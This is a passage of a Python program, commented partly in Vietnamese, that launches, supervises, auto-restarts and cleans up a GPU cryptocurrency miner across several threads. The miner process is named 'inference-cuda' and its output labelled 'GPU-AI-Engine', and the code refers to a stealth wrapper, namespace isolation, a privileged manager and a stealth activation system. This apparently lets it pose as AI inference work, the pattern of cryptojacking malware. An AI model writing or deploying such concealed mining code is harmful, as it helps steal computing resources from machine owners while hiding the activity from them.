                    'role': 'real',  # Always 'real' since we only log real mining PID
                    'miner_type': miner_type.lower(),
                    'command': ' '.join(mining_command),
                    'startup_time': startup_time,
                    'stealth_enabled': enable_stealth,  # GPU-only mode
                    'namespace_isolation': enable_ns and privileged_manager is not None,
                    'log_file': str(miner_log_path)
                }
                
                # Performance logging removed - simplified startup logging
                
                logger.info(f"PROCESS_START: {process_name} | PID={process.pid} | TYPE={miner_type} | TIME={startup_time}")
                
                # 🗑️ **REMOVED**: EventBus publishing replaced by DirectPIDRegistry
                # Process registration now handled by stealth_inference_cuda.py via DirectPIDRegistry
                try:
                    # 🆕 Determine correct PID for logging: prefer real mining PID if detected
                    event_pid = real_mining_pid if 'real_mining_pid' in locals() and real_mining_pid else process.pid
                    
                    logger.info(f"✅ Mining process started successfully:")
                    logger.info(f"   ├─ Type: {miner_type}")
                    logger.info(f"   ├─ PID: {event_pid}")
                    logger.info(f"   ├─ Name: {process_name}")
                    logger.info(f"   └─ Registration: Handled by DirectPIDRegistry in stealth wrapper")
                    
                except Exception as e:
                    logger.error(f"❌ Failed to log mining process information: {e}")
                

                # ✅ ENHANCED: Ensure log file creation với initial logging
                logger.info(f"📁 [Mining Log] Creating log file: {miner_log_path}")
                
                # **Open log file** (mở tệp log) cho **dual logging** (ghi log kép)
                log_file = open(miner_log_path, 'ab', buffering=0)
                
                # ✅ ENHANCED: Initial log entry để confirm file creation
                initial_log = f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] ===== MINING LOG STARTED =====\n"
                initial_log += f"Process: {process_name} (PID: {process.pid})\n"
                initial_log += f"Command: {' '.join(mining_command)}\n"
                initial_log += f"Log File: {miner_log_path}\n"
                initial_log += f"========================================\n"
                log_file.write(initial_log.encode('utf-8'))
                log_file.flush()
                
                logger.info(f"✅ [Mining Log] Log file initialized: {miner_log_path}")
                
                # **Start dual logging thread** (khởi chạy luồng ghi log kép)
                log_thread = threading.Thread(
                    target=dual_logger_thread,
                    args=(process, log_file, process_name, log_lock),
                    daemon=True
                )
                log_thread.start()
                logger.info(f"🚀 [Mining Log] Dual logging thread started for {process_name}")
                
                # Performance monitoring removed - simplified log monitoring
                
                time.sleep(2)
                if process.poll() is not None:
                    logger.error(f"Quá trình khai thác GPU kết thúc sớm.")
                    
                    # **Enhanced plugin logging for failures** (ghi log plugin nâng cao cho lỗi)
                    error_details = f"PID={process.pid} EXIT_CODE={process.returncode}"
                    # CPU plugin logging removed - GPU-only mode
                    log_gpu_plugin_operation("PROCESS_FAILURE", f"Early termination: {error_details}", "ERROR")
                    
                    # **Simple early termination logging** (ghi log kết thúc sớm đơn giản)
                    logger.error(f"EARLY_TERMINATION: {process_name} {error_details}")
                    process = None
                else:
                    # **Success logging** (ghi log thành công)
                    success_details = f"PID={process.pid} Command={' '.join(mining_command)}"
                    # CPU plugin logging removed - GPU-only mode
                    log_gpu_plugin_operation("PROCESS_SUCCESS", f"Mining process started: {success_details}", "INFO")
                    
                    logger.info(f"🔍 [DEBUG] About to return process object - PID: {process.pid}, Type: {type(process)}")
                    return process
                    
        except Exception as e:
            logger.error(f"🔍 [DEBUG] Exception caught in start_mining_process: {type(e).__name__}: {str(e)}")
            logger.error(f"Lỗi khi khởi động quá trình khai thác GPU: {e}")
            # **Enhanced debug info** (thông tin gỡ lỗi nâng cao) cho **cả CPU và GPU failures** (lỗi cả CPU và GPU)
            logger.error(f"🔍 Error Details - Exception: {type(e).__name__}: {str(e)}")
            logger.error(f"🔍 Error Details - Command: {' '.join(mining_command)}")
            logger.error(f"🔍 Error Details - Attempt: {attempt}/{retries}")
            import traceback
            logger.error(f"🔍 Error Details - Traceback: {traceback.format_exc()}")
            process = None
        if attempt < retries:
            logger.info(f"Đợi {delay} giây trước khi thử lại...")
            time.sleep(delay)
    logger.error(f"Không thể khởi chạy quá trình khai thác GPU.")
    stop_event.set()
    return None

def manage_gpu_miner(privileged_mgr, max_retries: int = 5):
    """
    **DEPRECATED**: Quản lý **lifecycle** (vòng đời) của **GPU miner** (máy khai thác GPU) - 
    **Replaced by gpu_mining_thread()** (thay thế bằng gpu_mining_thread())
    
    Note: Hàm này giữ lại để **backward compatibility** (tương thích ngược)
    """
    logger.warning("⚠️ manage_gpu_miner() is deprecated - use gpu_mining_thread() instead")
    return
    
    # **Enhanced initial logging** (ghi log ban đầu nâng cao)
    gpu_miner_logger.info("===== GPU MINER LIFECYCLE STARTED =====")
    gpu_miner_logger.info(f"Manager PID: {os.getpid()}")
    gpu_miner_logger.info(f"Thread ID: {threading.current_thread().ident}")
    gpu_miner_logger.info(f"Max Retries: {max_retries}")
    gpu_miner_logger.info("=========================================")
    
    # **Notify main logger** (thông báo logger chính)
    logger.info("✅ GPU Miner Manager initialized with dedicated logging")
    
    # **Enhanced mining loop** (vòng lặp khai thác nâng cao)
    gpu_miner_logger.info("🔄 Starting GPU mining supervision loop...")
    gpu_miner_logger.info(f"🔍 GPU Manager - Initial state: stop_event={stop_event.is_set()}, retries={retries}, max_retries={max_retries}")
    while not stop_event.is_set() and retries < max_retries:
        gpu_miner_logger.debug(f"🔄 GPU supervision cycle - stop_event={stop_event.is_set()}, retries={retries}")
        # **Direct access** (truy cập trực tiếp) để **avoid deadlock** (tránh khóa chết)
        process = gpu_process
        gpu_miner_logger.debug(f"🔍 Checking GPU process status: {process}")
        is_running = is_mining_process_running(process)
        gpu_miner_logger.debug(f"📊 GPU process running status: {is_running}")
        
        if not is_running:
            if process:
                gpu_miner_logger.warning("🔄 GPU miner stopped - attempting restart")
                logger.warning("Phát hiện GPU miner đã dừng. Thử khởi động lại...")
                retries += 1
            
            gpu_miner_logger.info(f"🚀 Starting GPU mining process (attempt {retries + 1}/{max_retries})")
            new_process = start_gpu_mining_process(privileged_manager=privileged_mgr)
            gpu_process = new_process
            
            if gpu_process and is_mining_process_running(gpu_process):
                gpu_miner_logger.info(f"✅ GPU miner started successfully - PID: {gpu_process.pid}")
                retries = 0  # Reset retries on successful start
            else:
                gpu_miner_logger.error(f"❌ GPU miner startup failed - attempt {retries}/{max_retries}")
        else:
            # **Process running - log status** (tiến trình đang chạy - ghi log trạng thái)
            gpu_miner_logger.debug(f"📊 GPU miner running normally - PID: {gpu_process.pid if gpu_process else 'Unknown'}")
            
            # Resource usage logging removed - simplified monitoring
        
        gpu_miner_logger.debug("⏳ Waiting 15s before next supervision cycle")
        time.sleep(15)
        
    if retries >= max_retries:
        gpu_miner_logger.error(f"🚨 GPU miner failed {max_retries} times - stopping supervision")
        logger.error("GPU miner đã thất bại quá nhiều lần. Dừng giám sát.")
        stop_event.set()
    
    gpu_miner_logger.info("===== GPU MINER LIFECYCLE ENDED =====")

def gpu_mining_thread():
    """**Thread 3: GPU Mining** (Luồng 3: Khai thác GPU) với **Progressive GPU Activation** (kích hoạt GPU tuần tự) và **DirectPIDRegistry integration** (tích hợp DirectPIDRegistry)"""
    global gpu_process
    # 🔧 FIX: Sử dụng gpu_miner_logger thay vì tạo thread_logger riêng
    thread_logger = gpu_miner_logger
    thread_logger.info("🎮 GPU Mining Thread Started")
    
    # 🚀 Progressive GPU Activation - Auto-detect GPU count và staged initialization
    gpu_count = 0
    try:
        import subprocess
        result = subprocess.run(['nvidia-smi', '--list-gpus'], capture_output=True, text=True)
        gpu_count = len([line for line in result.stdout.strip().split('\n') if line.strip()])
        thread_logger.info(f"🔍 [PROGRESSIVE-GPU] Auto-detected {gpu_count} GPUs")
    except Exception as e:
        thread_logger.warning(f"⚠️ [PROGRESSIVE-GPU] GPU detection failed: {e}, assuming 2 GPUs")
        gpu_count = 2
    
    # Calculate staged activation delay (5s per GPU to prevent memory spike)
    activation_delay = min(5 * gpu_count, 30)  # Max 30s delay
    thread_logger.info(f"🕰️ [PROGRESSIVE-GPU] Using {activation_delay}s staged activation delay")
    
    # 🗑️ EventBus completely removed - using DirectPIDRegistry for process communication
    max_retries = 5
    retries = 0
    
    # Môi trường đã được thiết lập đồng bộ trong main(); lấy privileged_manager_global
    global privileged_manager_global
    privileged_manager = privileged_manager_global
    thread_logger.info(f"🔍 GPU Thread - privileged_manager_global status: {privileged_manager_global is not None}")
    if privileged_manager is None:
        thread_logger.error("❌ Environment chưa sẵn sàng - dừng GPU mining thread")
        return  # GPU optional, không set stop_event
    
    # **GPU Mining Loop** (vòng lặp khai thác GPU) với **PID tracking** (theo dõi PID)
    while not stop_event.is_set() and retries < max_retries:
        try:
            process = gpu_process  # Direct access to avoid deadlock
            is_running = is_mining_process_running(process)
            thread_logger.debug(f"[TRACE] is_mining_process_running={is_running}, PID={getattr(process,'pid',None)}")
            if not is_running:
                thread_logger.info(f"🔄 Starting GPU mining process (attempt {retries + 1}/{max_retries})")
                
                # 🚀 Progressive GPU Activation: Staged initialization
                if retries == 0:  # First attempt
                    thread_logger.info(f"🚀 [PROGRESSIVE-GPU] Stage 1: Memory pre-allocation...")
                    time.sleep(2)  # Allow memory cleanup
                    
                    thread_logger.info(f"🚀 [PROGRESSIVE-GPU] Stage 2: GPU context initialization...")
                    time.sleep(activation_delay)  # Staged delay based on GPU count
                    
                    thread_logger.info(f"🚀 [PROGRESSIVE-GPU] Stage 3: Mining process launch...")
                
                new_process = start_gpu_mining_process(privileged_manager=privileged_manager)
                gpu_process = new_process
                thread_logger.info(f"🔍 [DEBUG] start_mining_process returned: {gpu_process} (type: {type(gpu_process)})")
                if gpu_process:
                    thread_logger.info(f"🔍 [DEBUG] GPU process received successfully - PID: {gpu_process.pid}")
                    # Enhanced PID Logger: register_process đã được gọi trong start_mining_process  
                    thread_logger.info(f"✅ GPU process PID {gpu_process.pid} registered for enhanced monitoring")
                else:
                    thread_logger.error(f"🔍 [DEBUG] GPU process is None - start_mining_process failed")
                
                if gpu_process:
                    try:
                        log_file_path = f"/app/mining_environment/logs/{os.getenv('GPU_PROCESS_NAME', 'inference-cuda')}_output.log"
                        gpu_log_file = open(log_file_path, 'ab')  # Open file handle for monitor thread
                        monitor_thread = threading.Thread(
                            target=monitor_process_output,
                            args=(gpu_process, "GPU-AI-Engine", gpu_log_file, thread_logger),
                            daemon=True,
                            name=f"GPUMonitor-{gpu_process.pid}"
                        )
                        monitor_thread.start()
                        thread_logger.info(f"📊 Started GPU output monitoring thread (ID: {monitor_thread.ident})")
                    except Exception as monitor_err:
                        thread_logger.error(f"❌ Failed to start GPU output monitoring: {monitor_err}")
                    
                    thread_logger.info(f"✅ GPU miner started - PID: {gpu_process.pid}")
                    retries = 0  # Reset on success
                else:
                    retries += 1
                    thread_logger.error(f"❌ GPU mining startup failed (attempt {retries}/{max_retries})")
            else:
                # **Process running - periodic PID update** (tiến trình đang chạy - cập nhật PID định kỳ)
                # DirectPIDRegistry handles all process communication - no EventBus needed
                thread_logger.debug("GPU miner healthy heartbeat")
                
        except Exception as e:
            thread_logger.error(f"❌ GPU Mining Thread error: {e}")
            retries += 1
        
        # **Shorter supervision interval for GPU** (khoảng thời gian giám sát ngắn hơn cho GPU)
        time.sleep(15)
    
    if retries >= max_retries:
        thread_logger.error(f"🚨 GPU mining failed {max_retries} times - stopping thread")
    
    thread_logger.info("🔚 GPU Mining Thread ended")

def resource_manager_thread():
    thread_logger = setup_logging('resource_manager_thread', str(Path(LOGS_DIR) / 'resource_manager_thread.log'), 'INFO')
    thread_logger.info("🔧 Starting Resource Manager Thread...")
    try:
        # **Step 1**: Load configuration
        thread_logger.info("📋 Loading ResourceManager configuration...")
        config_path = Path(os.getenv('CONFIG_DIR', '/app/mining_environment/config')) / "resource_config.json"
        
        if not config_path.exists():
            raise FileNotFoundError(f"Configuration file not found: {config_path}")
            
        with open(config_path, 'r') as f:
            config_data = json.loads(f.read())
        
        config = ConfigModel(**config_data)
        thread_logger.info("✅ ResourceManager configuration loaded")
        
        # **Step 2**: Initialize ResourceManager
        thread_logger.info("🔧 Creating ResourceManager instance...")
        resource_manager = ResourceManager(config, None, thread_logger)  # No event bus needed
        thread_logger.info("✅ ResourceManager instance created")
        
        # 🗑️ EventBus removed - ResourceManager uses DirectPIDRegistry observers
        
        # **Step 3**: Start ResourceManager
        thread_logger.info("🚀 Starting ResourceManager...")
        resource_manager.start()
        thread_logger.info("🎯 ResourceManager started successfully")
    except Exception as e:
        thread_logger.error(f"❌ Resource Manager Thread failed: {e}")
        resource_manager_failed_event.set()
        stop_event.set()
    thread_logger.info("🔚 Resource Manager Thread ended")

def environment_setup_thread():
    """**Thread 1: Environment Setup** (Luồng 1: Thiết lập môi trường) với **thread-safe operations** (thao tác an toàn luồng)"""
    global privileged_manager_global
    thread_logger = setup_logging('env_setup_thread', str(Path(LOGS_DIR) / 'env_setup_thread.log'), 'INFO')
    thread_logger.info("🌍 Environment Setup Thread Started")
    try:
        thread_logger.info("🔧 Starting environment initialization...")
        privileged_manager = initialize_environment()
        privileged_manager_global = privileged_manager  # ✅ FIX: Assign to global variable
        thread_logger.info(f"🔧 Environment setup completed - privileged_manager_global assigned: {privileged_manager_global is not None}")
        env_setup_complete_event.set()
        thread_logger.info("✅ Environment Setup Thread completed successfully")
        return privileged_manager
    except Exception as e:
        thread_logger.error(f"❌ Environment Setup Thread failed: {e}")
        env_setup_failed_event.set()
        stop_event.set()
        return None

def main():
    """**Multi-Threading Architecture Main Function** (hàm chính kiến trúc đa luồng) với **DirectPIDRegistry coordination** (phối hợp DirectPIDRegistry)"""
    logger.info("===== Bắt đầu hoạt động khai thác tiền điện tử (Multi-Threading Architecture) =====")
    
    # ------------------------------------------------------------------
    # 1️⃣ Thiết lập môi trường đồng bộ (DirectPIDRegistry replaces EventBus)
    # ------------------------------------------------------------------
    global privileged_manager_global
    try:
        logger.info("🔧 Đang thiết lập môi trường (synchronous)...")
        env_thread = threading.Thread(target=environment_setup_thread)
        env_thread.start()
        # Chờ environment setup hoàn thành hoặc thất bại
        while not (env_setup_complete_event.is_set() or env_setup_failed_event.is_set()):
            time.sleep(0.1)
        if env_setup_failed_event.is_set():
            logger.error("❌ Không thể thiết lập môi trường.")
            return
        # ✅ FIX: Remove incorrect assignment - privileged_manager_global already set in thread
        logger.info("✅ Thiết lập môi trường hoàn tất")
    except Exception as e:
        logger.error(f"❌ Không thể thiết lập môi trường: {e}")
        return  # Abort startup nếu môi trường lỗi

    # ------------------------------------------------------------------
    # 2️⃣ Khởi tạo DirectPIDRegistry cho giao tiếp PID / ResourceManager
    # ------------------------------------------------------------------
    # 🚀 Khởi động PID Logger worker với error handling và verification
    try:
        from pid_logger import _WORKER_STARTED
        start_worker()
        # Verify worker đã khởi chạy thành công
        for i in range(5):  # Retry 5 lần, mỗi lần 0.5s
            if _WORKER_STARTED.is_set():
                logger.info("🚀 PID Logger worker started successfully")
                break
            time.sleep(0.5)
            logger.info(f"⏳ Waiting for PID Logger worker to start... (attempt {i+1}/5)")
        else:
            logger.error("❌ PID Logger worker failed to start after 5 attempts")
            # Force restart worker
            from pid_logger import force_restart_worker
            force_restart_worker()
            logger.info("🔄 Force restarted PID Logger worker")
    except Exception as e:
        logger.error(f"❌ Failed to start PID Logger worker: {e}")
        # Fallback: try to start worker again
        try:
            start_worker()
            logger.info("🔄 Fallback PID Logger worker started")
        except Exception as e2:
            logger.error(f"❌ Fallback PID Logger worker also failed: {e2}")

    # 🤖 Auto PID Registration Thread để theo dõi và đăng ký tiến trình mining
    def auto_pid_registration_thread():
        """Luồng tự động theo dõi và đăng ký tiến trình mining mới"""
        import time as time_module
        import glob
        import os
        from pid_logger import register_process, _PROCESS_REGISTRY, debug_registry_status
        
        logger.info("🤖 Auto PID Registration Thread started")
        last_scan_pids = set()
        
        while True:
            try:
                # **GPU-Only Process Scanning** (quét tiến trình GPU duy nhất)
                current_pids = set()
                
                for proc_dir in glob.glob("/proc/[0-9]*"):
                    try:
                        pid = int(proc_dir.split('/')[-1])
                        with open(f"{proc_dir}/cmdline", 'r') as f:
                            cmdline = f.read().strip()
                        
                        # **GPU-Only**: Check inference-cuda only
                        if "inference-cuda" in cmdline and "stealth" not in cmdline:
                            current_pids.add((pid, "gpu", "inference-cuda"))
                            
                    except (OSError, IOError, ValueError):
                        continue
                
                # Đăng ký các PID mới
                new_pids = current_pids - last_scan_pids
                for pid, process_type, process_name in new_pids:
                    if pid not in _PROCESS_REGISTRY:
                        try:
                            # Sử dụng psutil để tạo real process object
                            real_proc = psutil.Process(pid)
                            
                            register_process(pid, process_type, real_proc, process_name)
                            logger.info(f"🤖 Auto-registered new {process_type} mining PID: {pid} with real psutil process object")
                        except psutil.NoSuchProcess:
                            logger.warning(f"🤖 Process PID {pid} no longer exists during registration")
                        except psutil.AccessDenied:
                            logger.warning(f"🤖 Access denied for PID {pid}, using fallback fake process")
                            # Fallback to fake process if access denied
                            fake_proc = type('FakeProcess', (), {
                                'poll': lambda: None if os.path.exists(f"/proc/{pid}") else 0,
                                'is_running': lambda: os.path.exists(f"/proc/{pid}")
                            })()
                            register_process(pid, process_type, fake_proc, process_name)
                            logger.info(f"🤖 Auto-registered new {process_type} mining PID: {pid} with fallback fake process")
                        except Exception as e:
                            logger.warning(f"🤖 Auto-registration failed for PID {pid}: {e}")
                
                last_scan_pids = current_pids
                
                # Debug info mỗi 30s
                if time_module.time() % 30 < 5:  # Gần như mỗi 30s
                    debug_registry_status()
                
                time_module.sleep(5)  # Scan mỗi 5 giây
                
            except Exception as e:
                logger.error(f"🤖 Auto PID Registration Thread error: {e}")
                time_module.sleep(10)  # Sleep dài hơn khi có lỗi
    
    # Thêm khai báo danh sách mining_threads
    mining_threads = []
    
    # Thêm Auto PID Registration Thread
    auto_pid_thread = threading.Thread(
        target=auto_pid_registration_thread,
        daemon=True,
        name="AutoPIDRegistrationThread"
    )
    mining_threads.append(('Auto PID Registration', auto_pid_thread, True))

    # (Đã bỏ EnvironmentSetupThread – môi trường thiết lập đồng bộ)

    # **Thread 4: Resource Manager** (Luồng 4: Trình quản lý tài nguyên)
    resource_thread = threading.Thread(
        target=resource_manager_thread,
        daemon=True,
        name="ResourceManagerThread"
    )
    mining_threads.append(('Resource Manager', resource_thread, True))

    # ✅ **CPU MINING PERMANENTLY REMOVED** - GPU-only mining operations

    # **Thread 3: GPU Mining** (Luồng 3: Khai thác GPU)
    gpu_thread = threading.Thread(
        target=gpu_mining_thread,
        daemon=True,
        name="GPUMiningThread"
    )
    mining_threads.append(('GPU Mining', gpu_thread, True))
    
    # **Sequential Thread Startup** (Khởi động luồng tuần tự) với **dependency management** (quản lý phụ thuộc)
    logger.info("🚀 Starting threads in dependency order...")
    
    started_threads = []
    for thread_type, thread, enabled in mining_threads:
        if enabled:
            try:
                thread.start()
                started_threads.append((thread_type, thread))
                logger.info(f"✅ {thread_type} Thread started (ID: {thread.ident})")
                
                # **Startup delay** (độ trễ khởi động) để **sequential initialization** (khởi tạo tuần tự)
                time.sleep(1.0)
                
            except Exception as e:
                logger.error(f"❌ Failed to start {thread_type} Thread: {e}")
        else:
            logger.info(f"⏸️ {thread_type} Thread disabled by configuration")
    
    # **Thread Health Verification** (Xác minh sức khỏe luồng) với **DirectPIDRegistry monitoring** (giám sát DirectPIDRegistry)
    logger.info("🔍 Verifying threads health...")
    time.sleep(5)  # Cho phép threads khởi tạo hoàn tất
    
    # **GPU-Only DirectPIDRegistry Status** (trạng thái DirectPIDRegistry GPU duy nhất)
    thread_status = {
        'gpu_pid_registered': False
    }
    
    active_count = sum(1 for _, thread in started_threads if thread.is_alive())
    logger.info(f"🎯 Active threads: {active_count}/{len(started_threads)}")
    
    if active_count > 0:
        logger.info("🚀 MULTI-THREADING ARCHITECTURE STARTUP COMPLETED")
    else:
        logger.error("❌ No threads are running - check configuration and logs")
        stop_event.set()
        return
    
    # Performance monitoring removed - simplified thread management
    
    # **Thread monitoring loop** (vòng lặp giám sát luồng) với **DirectPIDRegistry coordination** (phối hợp DirectPIDRegistry)
    try:
        monitoring_interval = 30  # seconds
        while not stop_event.is_set():
            # **Thread health check** (kiểm tra sức khỏe luồng)
            for thread_name, thread in started_threads:
                if not thread.is_alive():
                    logger.warning(f"⚠️ {thread_name} thread has stopped")
                    
                    # 🗑️ **REMOVED**: EventBus notifications replaced by DirectPIDRegistry
                    logger.info(f"⚠️ {thread_name} thread has stopped - using DirectPIDRegistry for notifications")
            
            # **Simple GPU process health check** (kiểm tra sức khỏe tiến trình GPU đơn giản)
            with process_lock:
                gpu_alive = is_mining_process_running(gpu_process)
            
            if not gpu_alive:
                logger.warning("⚠️ GPU mining process stopped!")
                print(f"\033[91m⚠️ GPU MINING PROCESS STOPPED!\033[0m", flush=True)
            
            # **System health check** (kiểm tra sức khỏe hệ thống) - using DirectPIDRegistry
            logger.info(f"🔍 System health: {sum(1 for _, thread in started_threads if thread.is_alive())}/{len(started_threads)} threads alive, GPU alive: {gpu_alive}")
            
            time.sleep(monitoring_interval)
            
    except KeyboardInterrupt:
        logger.info("Nhận tín hiệu KeyboardInterrupt. Đang dừng...")
        stop_event.set()
    
    # **Thread cleanup and synchronization** (dọn dẹp và đồng bộ hóa luồng)
    logger.info("🧹 Starting thread cleanup and synchronization...")
    
    # 🗑️ **REMOVED**: EventBus shutdown - DirectPIDRegistry handles cleanup automatically
    logger.info(f"🔚 System shutdown initiated: {sum(1 for _, thread in started_threads if thread.is_alive())} active threads")
    
    # **Graceful thread termination** (kết thúc luồng nhẹ nhàng) với timeout
    thread_shutdown_timeout = 10  # seconds
    for thread_name, thread in started_threads:
        if thread.is_alive():
            logger.info(f"🔄 Waiting for {thread_name} thread to finish...")
            thread.join(timeout=thread_shutdown_timeout)
            
            if thread.is_alive():
                logger.warning(f"⚠️ {thread_name} thread did not stop within {thread_shutdown_timeout}s - forced termination")
            else:
                logger.info(f"✅ {thread_name} thread stopped gracefully")
    
    # **Step 5**: Stealth system cleanup
    logger.info("📋 Step 5/5: Cleaning up stealth activation system...")
    try:
        cleanup_stealth_activation()
        logger.info("✅ Stealth activation system cleanup completed")
    except Exception as e:
        logger.error(f"❌ Error cleaning up stealth activation system: {e}")
    
    # **Cleanup** (dọn dẹp) và thoát
    logger.info("Bắt đầu quá trình dọn dẹp cuối cùng...")
    
    # Performance reporting removed - simplified cleanup
    
    
    # **GPU-Only Process Cleanup** (dọn dẹp tiến trình GPU duy nhất)
    logger.info("🧹 Cleaning up GPU mining process...")
    with process_lock:
        # **Terminate GPU Process** (kết thúc tiến trình GPU)
        if gpu_process and gpu_process.poll() is None:
            logger.info(f"Dừng tiến trình GPU miner (PID: {gpu_process.pid})...")
            try:
                gpu_process.terminate()
                gpu_process.wait(timeout=5)  # Wait for graceful termination
                logger.info("✅ GPU process terminated gracefully")
            except subprocess.TimeoutExpired:
                logger.warning("⚠️ GPU process did not terminate gracefully, forcing kill")
                gpu_process.kill()
            except Exception as e:
                logger.error(f"❌ Error terminating GPU process: {e}")
    
    logger.info("Hệ thống đã dừng. Thoát.")

if __name__ == "__main__":
    main()
